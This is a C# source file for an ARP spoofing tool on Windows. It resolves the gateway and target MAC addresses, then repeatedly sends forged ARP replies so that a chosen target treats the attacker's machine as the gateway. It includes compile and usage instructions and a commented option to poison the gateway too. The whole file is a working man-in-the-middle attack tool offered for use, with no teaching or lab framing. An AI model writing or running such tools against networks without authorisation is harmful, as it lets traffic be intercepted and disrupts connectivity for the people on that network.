// ARP Spoofing in C# for Windows
// Requires: Install-Package SharpPcap
// Compile: csc /reference:SharpPcap.dll,PacketDotNet.dll arp_spoof_csharp.cs
// Or use Visual Studio with NuGet packages: SharpPcap, PacketDotNet

using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using SharpPcap;
using SharpPcap.LibPcap;
using PacketDotNet;
using PacketDotNet.Utils;

namespace ArpSpoof
{
    class Program
    {
        static bool keepSpoofing = true;

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: arp_spoof_csharp.exe <gateway_ip> <target_ip>");
                Console.WriteLine("Example: arp_spoof_csharp.exe 192.168.1.1 192.168.1.100");
                return;
            }

            string gatewayIP = args[0];
            string targetIP = args[1];

            Console.WriteLine("[!] Windows ARP Spoofing - C# Edition");
            Console.WriteLine("[!] Warning: This will disrupt network connectivity");
            
            // Get network device
            var devices = LibPcapLiveDeviceList.Instance;
            if (devices.Count < 1)
            {
                Console.WriteLine("[-] No network devices found");
                return;
            }

            // Use first active device (you may need to select the right one)
            LibPcapLiveDevice device = devices[0];
            
            Console.WriteLine($"[+] Using device: {device.Description}");
            device.Open(DeviceModes.Promiscuous, 1000);

            // Get MAC addresses
            PhysicalAddress gatewayMAC = GetMacAddress(gatewayIP, device);
            PhysicalAddress targetMAC = GetMacAddress(targetIP, device);
            PhysicalAddress attackerMAC = device.MacAddress;

            if (gatewayMAC == null || targetMAC == null)
            {
                Console.WriteLine("[-] Could not resolve MAC addresses");
                device.Close();
                return;
            }

            Console.WriteLine($"[+] Gateway MAC: {gatewayMAC}");
            Console.WriteLine($"[+] Target MAC: {targetMAC}");
            Console.WriteLine($"[+] Attacker MAC: {attackerMAC}");
            Console.WriteLine("[+] Starting ARP spoofing... Press Ctrl+C to stop");

            // Handle Ctrl+C
            Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true;
                keepSpoofing = false;
                Console.WriteLine("\n[+] Stopping ARP spoofing...");
            };

            // Spoofing loop
            while (keepSpoofing)
            {
                // Spoof target: tell target that we are the gateway
                SendArpReply(device, attackerMAC, IPAddress.Parse(gatewayIP), 
                            targetMAC, IPAddress.Parse(targetIP));
                
                // Optionally, spoof gateway: tell gateway that we are the target
                // SendArpReply(device, attackerMAC, IPAddress.Parse(targetIP), 
                //             gatewayMAC, IPAddress.Parse(gatewayIP));
                
                Thread.Sleep(2000);
            }

            // Restore ARP tables
            Console.WriteLine("[+] Restoring ARP tables...");
            for (int i = 0; i < 5; i++)
            {
                SendArpReply(device, gatewayMAC, IPAddress.Parse(gatewayIP), 
                            targetMAC, IPAddress.Parse(targetIP));
                Thread.Sleep(100);
            }

            device.Close();
            Console.WriteLine("[+] Exited gracefully");
        }

        static PhysicalAddress GetMacAddress(string ipAddress, LibPcapLiveDevice device)
        {
            // Send ARP request and capture response
            // Simplified - you'd need to implement full ARP request/response handling
            try
            {
                // Use ARP cache
                var arpOutput = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "arp",
                    Arguments = $"-a {ipAddress}",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                });

                string output = arpOutput.StandardOutput.ReadToEnd();
                arpOutput.WaitForExit();

                // Parse MAC from output (simplified)
                var lines = output.Split('\n');
                foreach (var line in lines)
                {
                    if (line.Contains(ipAddress))
                    {
                        var parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                        if (parts.Length >= 2)
                        {
                            string macStr = parts[1].Replace("-", ":");
                            return PhysicalAddress.Parse(macStr.Replace(":", ""));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error getting MAC: {ex.Message}");
            }

            return null;
        }

        static void SendArpReply(LibPcapLiveDevice device, PhysicalAddress senderMAC, 
                                IPAddress senderIP, PhysicalAddress targetMAC, IPAddress targetIP)
        {
            // Create Ethernet packet
            var ethernetPacket = new EthernetPacket(senderMAC, targetMAC, EthernetType.Arp);

            // Create ARP packet
            var arpPacket = new ArpPacket(ArpOperation.Response, targetMAC, targetIP, 
                                         senderMAC, senderIP);

            ethernetPacket.PayloadPacket = arpPacket;

            // Send packet
            device.SendPacket(ethernetPacket);
            Console.WriteLine($"[+] Sent ARP reply: {senderIP} is at {senderMAC} to {targetIP}");
        }
    }
}
